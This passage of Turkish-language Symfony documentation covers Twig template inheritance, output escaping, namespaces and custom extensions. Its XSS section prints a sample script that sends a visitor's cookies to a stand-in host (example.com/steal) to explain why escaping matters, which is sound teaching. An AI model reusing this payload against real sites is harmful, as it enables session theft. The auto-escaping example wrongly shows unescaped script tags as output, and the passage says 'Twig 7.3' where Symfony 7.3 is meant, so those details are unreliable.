>>> `block` etiketleri, alt şablonlar tarafından **geçersiz kılınabilir (override)** bölümleri tanımlar.
>>>
>>> `title` gibi bazı bloklar varsayılan içerik de barındırabilir.
>>>
>>
>> ---
>>
>> ### 2️⃣ `blog/layout.html.twig`
>>
>> ```twig
>> {# templates/blog/layout.html.twig #}
>> {% extends 'base.html.twig' %}
>>
>> {% block content %}
>>     <h1>Blog</h1>
>>
>>     {% block page_contents %}{% endblock %}
>> {% endblock %}
>> ```
>>
>> Bu şablon, `base.html.twig`’i genişletir ve yalnızca `content` bloğunu tanımlar.
>>
>> ---
>>
>> ### 3️⃣ `blog/index.html.twig`
>>
>> ```twig
>> {# templates/blog/index.html.twig #}
>> {% extends 'blog/layout.html.twig' %}
>>
>> {% block title %}Blog Index{% endblock %}
>>
>> {% block page_contents %}
>>     {% for article in articles %}
>>         <h2>{{ article.title }}</h2>
>>         <p>{{ article.body }}</p>
>>     {% endfor %}
>> {% endblock %}
>> ```
>>
>> Bu şablon ikinci seviye (`blog/layout.html.twig`) şablonu genişletir ve hem
>>
>> `page_contents` (layout’tan) hem de `title` (base’ten) bloklarını geçersiz kılar.
>>
>> ---
>>
>> ### ⚠️ Önemli Kural
>>
>> `extends` kullanan bir alt şablon, **block dışına içerik yazamaz.**
>>
>> Aşağıdaki örnek hata üretir:
>>
>> ```twig
>> {% extends 'base.html.twig' %}
>> <div class="alert">Some Alert</div> {# ❌ HATA #}
>> {% block content %}My cool blog posts{% endblock %} {# ✅ Geçerli #}
>> ```
>>
>> ---
>>
>>>
>>> ### Çıktı Kaçışlama (Output Escaping) ve XSS Saldırıları
>>>
>>> Twig şablonlarında kullanıcı girdilerini doğrudan HTML’ye yazdırmak güvenlik açığı oluşturabilir.
>>>
>>> Örneğin aşağıdaki kodu ele alalım:
>>>
>>> ```twig
>>> Hello {{ name }}
>>> ```
>>>
>>> Kötü niyetli bir kullanıcı ismini şu şekilde ayarlarsa:
>>>
>>> ```html
>>> My Name
>>> <script type="text/javascript">
>>>     document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
>>> </script>
>>> ```
>>>
>>> Sayfada “My Name” görüntülenir, ancak saldırgan sizin çerezlerinizi gizlice ele geçirmiş olur.
>>>
>>> Bu tür saldırılara **XSS (Cross-Site Scripting)** denir.
>>>
>>> ---
>>>
>>> ### 🔒 Symfony ve Twig’de Otomatik Çıktı Kaçışlama
>>>
>>> Symfony uygulamaları **varsayılan olarak güvenlidir** çünkü Twig otomatik olarak çıktı kaçışlama uygular.
>>>
>>> Bu, özel karakterleri HTML’de zararsız hâle dönüştürür (örneğin `<` karakteri `&lt;` olur):
>>>
>>> ```twig
>>> <p>Hello {{ name }}</p>
>>> ```
>>>
>>> Eğer `name` değeri `<script>alert('hello!')</script>` ise Twig çıktısı şu şekilde olur:
>>>
>>> ```html
>>> <p>Hello <script>alert('hello!')</script></p>
>>> ```
>>>
>>> Yani JavaScript kodu çalışmaz, sadece metin olarak görünür.
>>>
>>> ---
>>>
>>> ### 🧩 `raw` Filtresiyle Kaçışlamayı Devre Dışı Bırakmak
>>>
>>> Bazen güvenilir ve HTML içeriği barındıran bir değişkeni **doğrudan** render etmek isteyebilirsiniz.
>>>
>>> Bu durumda `raw` filtresini kullanarak kaçışlamayı devre dışı bırakabilirsiniz:
>>>
>>> ```twig
>>> <h1>{{ product.title|raw }}</h1>
>>> ```
>>>
>>> Eğer `product.title` şu şekildeyse:
>>>
>>> ```html
>>> Lorem <strong>Ipsum</strong>
>>> ```
>>>
>>> Twig bu içeriği **aynen** çıktı olarak verir, yani `<strong>` etiketi korunur.
>>>
>>>> ⚠️ `raw` filtresini yalnızca **güvenilir** HTML verilerde kullanın.
>>>>
>>>> Kullanıcı girdilerini asla `raw` ile yazdırmayın.
>>>>
>>>
>>> Daha fazla bilgi için [Twig Output Escaping](https://twig.symfony.com/doc/3.x/filters/escape.html) dokümantasyonuna göz atabilirsiniz.
>>>
>>> ---
>>>
>>> ## 🗂️ Şablon Ad Alanları (Template Namespaces)
>>>
>>> Varsayılan olarak Twig şablonları `templates/` dizininde bulunur.
>>>
>>> Ancak bazı şablonları farklı klasörlerde tutmak isteyebilirsiniz.
>>>
>>> Bu durumda `twig.paths` seçeneğini kullanarak ek dizinler tanımlayabilirsiniz:
>>>
>>> ```php
>>> // config/packages/twig.php
>>> use Symfony\Config\TwigConfig;
>>>
>>> return static function (TwigConfig $twig): void {
>>>     // Proje kök dizinine göre yollar
>>>     $twig->path('email/default/templates', null);
>>>     $twig->path('backend/templates', null);
>>> };
>>> ```
>>>
>>> Symfony, şablon ararken önce bu dizinleri, sonra varsayılan `templates/` dizinini kontrol eder.
>>>
>>> Bu yapılandırmayla `layout.html.twig` render edildiğinde Symfony şu sırayla kontrol eder:
>>>
>>> 1. `email/default/templates/layout.html.twig`
>>> 2. `backend/templates/layout.html.twig`
>>> 3. `templates/layout.html.twig`
>>>
>>> Bu bazen karışıklığa neden olabilir; işte bu yüzden **namespace** (ad alanı) kullanmak daha iyidir.
>>>
>>> ---
>>>
>>> ### 🧭 Namespace Tanımlama
>>>
>>> Her klasör için bir ad alanı tanımlayabilirsiniz:
>>>
>>> ```php
>>> $twig->path('email/default/templates', 'email');
>>> $twig->path('backend/templates', 'admin');
>>> ```
>>>
>>> Artık aşağıdaki şekilde şablonlara erişebilirsiniz:
>>>
>>> ```twig
>>> {% include '@email/layout.html.twig' %}
>>> {% include '@admin/layout.html.twig' %}
>>> ```
>>>
>>>> Aynı namespace birden fazla klasörle eşleştirilebilir.
>>>>
>>>> Twig, ilk tanımlanan yoldan başlayarak şablonları arar.
>>>>
>>>
>>> ---
>>>
>>> ## 📦 Bundle Şablonları (Bundle Templates)
>>>
>>> Yüklü paketler veya bundle’lar kendi Twig şablonlarını içerebilir.
>>>
>>> Symfony, bu şablonları **otomatik olarak bundle adından türetilen bir namespace altında** erişilebilir kılar.
>>>
>>> Örneğin:
>>>
>>> ```
>>> vendor/acme/blog-bundle/templates/user/profile.html.twig
>>> ```
>>>
>>> Bu dosyaya Twig üzerinden şu şekilde erişebilirsiniz:
>>>
>>> ```twig
>>> {% include '@AcmeBlog/user/profile.html.twig' %}
>>> ```
>>>
>>> İsterseniz kendi şablonlarınızla bu bundle şablonlarını **override** (ezme) yapabilirsiniz.
>>>
>>> ---
>>>
>>> ## 🧱 Twig Uzantıları (Twig Extensions)
>>>
>>> Twig uzantıları, Twig içinde **özel filtreler, fonksiyonlar veya testler** oluşturmanıza olanak tanır.
>>>
>>> Kendi uzantınızı yazmadan önce şu kaynakları kontrol edin:
>>>
>>> * Twig’in varsayılan filtre ve fonksiyonları
>>> * Symfony’nin eklediği Twig filtreleri
>>> * Resmî Twig eklentileri (strings, HTML, i18n, Markdown, vb.)
>>>
>>> ---
>>>
>>> ### 🧮 Örnek: `price` Adında Bir Filtre Oluşturma
>>>
>>> Şu şekilde bir kullanım hedefleniyor:
>>>
>>> ```twig
>>> {{ product.price|price }}
>>> {{ product.price|price(2, ',', '.') }}
>>> ```
>>>
>>> #### 1️⃣ Uzantı sınıfını oluşturun
>>>
>>> ```php
>>> // src/Twig/AppExtension.php
>>> namespace App\Twig;
>>>
>>> use Twig\Attribute\AsTwigFilter;
>>>
>>> class AppExtension
>>> {
>>>     #[AsTwigFilter('price')]
>>>     public function formatPrice(
>>>         float $number,
>>>         int $decimals = 0,
>>>         string $decPoint = '.',
>>>         string $thousandsSep = ','
>>>     ): string {
>>>         $price = number_format($number, $decimals, $decPoint, $thousandsSep);
>>>         return '$' . $price;
>>>     }
>>> }
>>> ```
>>>
>>> #### 2️⃣ Örnek: Fonksiyon tanımlamak isterseniz
>>>
>>> ```php
>>> use Twig\Attribute\AsTwigFunction;
>>>
>>> class AppExtension
>>> {
>>>     #[AsTwigFunction('area')]
>>>     public function calculateArea(int $width, int $length): int
>>>     {
>>>         return $width * $length;
>>>     }
>>> }
>>> ```
>>>
>>>> 🆕 `#[AsTwigFilter]`, `#[AsTwigFunction]`, ve `#[AsTwigTest]` öznitelikleri **Symfony 7.3** ile birlikte eklenmiştir.
>>>>
>>>> Önceki sürümlerde `AbstractExtension` sınıfını genişletip `getFilters()` ve `getFunctions()` metotlarını override etmeniz gerekiyordu.
>>>>
>>>
>>> ---
>>>
>>> ### 🔧 Uzantıyı Servis Olarak Kaydetme
>>>
>>> Eğer varsayılan `services.yaml` yapılandırmasını kullanıyorsanız, Symfony uzantınızı otomatik olarak algılar.
>>>
>>> Aksi takdirde, servisinize `twig.attribute_extension` etiketi eklemeniz gerekir.
>>>
>>> Filtrenizin başarıyla tanımlandığını doğrulamak için:
>>>
>>> ```bash
>>> php bin/console debug:twig
>>> php bin/console debug:twig --filter=price
>>> ```
>>>
>>> ---
>>>
>>> ## 💤 Lazy-Loaded Twig Uzantıları (Tembel Yüklenen Uzantılar)
>>>
>>> Twig 7.3’teki attribute tabanlı uzantılar zaten **lazy-loaded** çalışır — yani yalnızca kullanıldıklarında yüklenirler.
>>>
>>> Ancak klasik `AbstractExtension` yaklaşımını kullanıyorsanız, Twig  **tüm uzantıları baştan yükler** , bu da performansı düşürebilir.
>>>
>>> ### 🪄 Çözüm: Uzantı ve Mantığı Ayırmak
>>>
>>> #### 1️⃣ Uzantı sınıfı (filter tanımı)
>>>
>>> ```php
>>> // src/Twig/AppExtension.php
>>> namespace App\Twig;
>>>
>>> use App\Twig\AppRuntime;
>>> use Twig\Extension\AbstractExtension;
>>> use Twig\TwigFilter;
>>>
>>> class AppExtension extends AbstractExtension
>>> {
>>>     public function getFilters(): array
>>>     {
>>>         return [
>>>             new TwigFilter('price', [AppRuntime::class, 'formatPrice']),
>>>         ];
>>>     }
>>> }
>>> ```
>>>
>>> #### 2️⃣ Runtime sınıfı (mantık burada)
>>>
>>> ```php
>>> // src/Twig/AppRuntime.php
>>> namespace App\Twig;
>>>
>>> use Twig\Extension\RuntimeExtensionInterface;
>>>
>>> class AppRuntime implements RuntimeExtensionInterface
>>> {
>>>     public function __construct()
>>>     {
>>>         // Gerekirse servisleri buradan enjekte edebilirsiniz
>>>     }
>>>
>>>     public function formatPrice(
>>>         float $number,
>>>         int $decimals = 0,
>>>         string $decPoint = '.',
>>>         string $thousandsSep = ','
>>>     ): string {
>>>         $price = number_format($number, $decimals, $decPoint, $thousandsSep);
>>>         return '$' . $price;
>>>     }
>>> }
>>> ```
>>>
>>> Varsayılan `services.yaml` yapılandırmasını kullanıyorsanız bu sistem **otomatik olarak** çalışır.
>>>
>>> Aksi durumda `AppRuntime` servisini manuel olarak tanımlayıp `twig.runtime` etiketi eklemeniz gerekir.
>>>
>>
